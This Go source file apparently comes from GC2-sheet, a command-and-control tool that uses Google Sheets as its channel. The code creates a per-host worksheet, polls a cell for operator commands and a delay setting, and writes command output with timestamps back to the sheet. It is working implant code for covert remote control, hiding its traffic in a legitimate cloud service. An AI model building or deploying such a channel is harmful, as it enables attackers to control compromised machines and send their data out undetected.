package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"fmt"
	"strconv"

	"google.golang.org/api/sheets/v4"
)

type GoogleCommandExecutor struct {
	connector       *sheets.Service
	googleSheetID   string
	googleSheetName string
	commands        []*Command
}

func NewGoogleCommandExecutor(connector *GoogleConnector) (*GoogleCommandExecutor, error) {
	googleCommandExecutor := &GoogleCommandExecutor{
		connector:       &connector.googleSheetConnector,
		googleSheetID:   configuration.GetOptionsGoogleSheetID(),
		googleSheetName: utils.GetUniqueHostnameName(),
	}

	err := createGoogleWorksheet(googleCommandExecutor)
	if err != nil {
		return nil, err
	}

	return googleCommandExecutor, nil
}

var ErrorUnableToCreateGoogleSpreadsheet = fmt.Errorf("an error occurred while creating Google spreadsheet")
var ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration = fmt.Errorf(
	"an error occurred while creating default Google spreadsheet configuration",
)

const sheetCommandCell = "A"
const sheetOutputStartCell = "B"
const sheetOutputEndCell = "C"
const sheetTickerCell = "E2"

func createGoogleWorksheet(commandExecutor *GoogleCommandExecutor) error {
	sheetName := commandExecutor.googleSheetName

	var requests []*sheets.Request

	request := &sheets.Request{}
	addSheetRequest := &sheets.AddSheetRequest{}
	sheetProperties := &sheets.SheetProperties{Title: sheetName}

	addSheetRequest.Properties = sheetProperties
	request.AddSheet = addSheetRequest
	requests = append(requests, request)

	batchUpdateSpreadSheetRequest := &sheets.BatchUpdateSpreadsheetRequest{Requests: requests}

	responseBatchUpdate, err := commandExecutor.connector.Spreadsheets.BatchUpdate(
		commandExecutor.googleSheetID,
		batchUpdateSpreadSheetRequest,
	).Do()
	if err != nil {
		return err
	}

	if responseBatchUpdate == nil {
		return ErrorUnableToCreateGoogleSpreadsheet
	}

	writeRange := fmt.Sprintf("%s!D2:%s", sheetName, sheetTickerCell)
	writeData := [][]interface{}{{"Delay configuration (sec)", DefaultTickerDuration}}

	var valueRange = &sheets.ValueRange{
		Range:  writeRange,
		Values: writeData,
	}

	responseValueUpdate, err := commandExecutor.connector.Spreadsheets.Values.Update(
		commandExecutor.googleSheetID,
		writeRange,
		valueRange,
	).ValueInputOption("RAW").Do()
	if err != nil {
		return err
	}

	if responseValueUpdate == nil {
		return ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration
	}

	utils.LogDebug("[+] Sheet successfully created: " + sheetName)
	return nil
}

func (g *GoogleCommandExecutor) pullCommandAndTicker() (string, int, error) {
	var commandResult string
	var tickerDelayResult int

	rangeId := strconv.Itoa(g.getLastCommand().RowId)
	// Example: Sheet1!A2
	readRange := fmt.Sprintf("%s!%s%s", g.googleSheetName, sheetCommandCell, rangeId)

	resp, err := g.connector.Spreadsheets.Values.Get(g.googleSheetID, readRange).Do()
	if err != nil {
		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
	}

	if len(resp.Values) != 0 {
		// Get result
		commandResult = resp.Values[0][0].(string)
	} else {
		commandResult = ""
	}

	// TODO: We should merge this call with the previous one
	readRange = fmt.Sprintf("%s!%s", g.googleSheetName, sheetTickerCell)
	resp, err = g.connector.Spreadsheets.Values.Get(g.googleSheetID, readRange).Do()
	if err != nil {
		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
	}

	if len(resp.Values) != 0 {
		tickerDelayResult, err = strconv.Atoi(resp.Values[0][0].(string))
		if err != nil {
			tickerDelayResult = 0
			err = fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
		}
	} else {
		tickerDelayResult = 0
	}

	return commandResult, tickerDelayResult, err
}

func (g *GoogleCommandExecutor) pushOutput(lastCommand *Command) error {
	rowId := strconv.Itoa(lastCommand.RowId)
	sheetRange := fmt.Sprintf(
		"%s!%s%s:%s%s",
		g.googleSheetName,
		sheetOutputStartCell,
		rowId,
		sheetOutputEndCell,
		rowId,
	)

	outputCommand := lastCommand.Output
	var output [][]interface{}
	output = append(output, make([]interface{}, 2))

	output[0][0] = outputCommand
	output[0][1] = utils.GetCurrentDate()

	valueRange := &sheets.ValueRange{
		Range:  sheetRange,
		Values: output,
	}

	valueInputOption := "RAW"
	updateCell := g.connector.Spreadsheets.Values.Update(g.googleSheetID, sheetRange, valueRange)
	_, err := updateCell.ValueInputOption(valueInputOption).Do()
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
	}

	return nil
}

func (g *GoogleCommandExecutor) appendEmptyCommand() {
	var rowId int

	last := g.getLastCommand()
	if last == nil {
		rowId = configuration.GetRowId()
	} else {
		rowId = last.RowId + 1
	}

	g.commands = append(g.commands, NewCommand(rowId))
}

func (g *GoogleCommandExecutor) getLastCommand() *Command {
	if len(g.commands) == 0 {
		return nil
	}

	return g.commands[len(g.commands)-1]
}
